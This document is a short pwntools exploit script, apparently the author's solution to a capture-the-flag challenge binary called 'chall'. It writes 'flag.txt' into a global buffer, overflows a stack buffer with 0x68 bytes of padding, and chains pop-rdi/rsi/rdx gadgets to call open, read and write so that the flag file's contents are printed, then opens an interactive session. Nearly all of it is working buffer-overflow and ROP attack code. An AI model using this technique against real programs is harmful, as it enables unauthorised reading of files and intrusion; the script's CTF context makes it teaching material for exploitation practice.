#!/usr/bin/env python3

# Title:        solve.py
# Description:  00 solution
# Author:       bluecosmo

from pwn import *

gdbcmds = """
b * challenge + 44
b * not_the_useful_func_youre_looking_for + 55
b * not_the_useful_func_youre_looking_for + 44
c
"""

context.terminal = ["tmux", "splitw", "-h"]
elf = context.binary = ELF("./chall")
p = process(elf.path)
# p = gdb.debug(elf.path, gdbscript=gdbcmds)

a_username = p64(0x4040c0)
a_puts = p64(elf.symbols["challenge"] + 22)
a_write = p64(elf.symbols["not_the_useful_func_youre_looking_for"] + 30)
a_open = p64(elf.symbols["not_the_useful_func_youre_looking_for"] + 55)
a_read = p64(elf.plt["read"])

POP_RDI = p64(0x00000000004012ac) # pop rdi ; ret
POP_RSI = p64(0x000000000040122f) # pop rsi ; ret
POP_RDX = p64(0x0000000000401377) # pop rdx ; ret

# Step 1: write flag to global address (username)
p.sendline("flag.txt")

# Step 2: open("flag.txt", O_RDWR)
p.recvuntil(b"on?\n")
payload = b"A" * 0x68
payload += POP_RDI + a_username
payload += POP_RSI + p64(0x2)
payload += a_open

# Step 3: read from file descriptor
payload += p64(0x3)
payload += POP_RSI + a_username
payload += POP_RDX + p64(0x29)
payload += a_read
#
# # Step 4: write to stdout
payload += POP_RDI + p64(0x1)
payload += POP_RSI + a_username
payload += POP_RDX + p64(0xff)
payload += a_write

p.sendline(payload)
p.interactive()
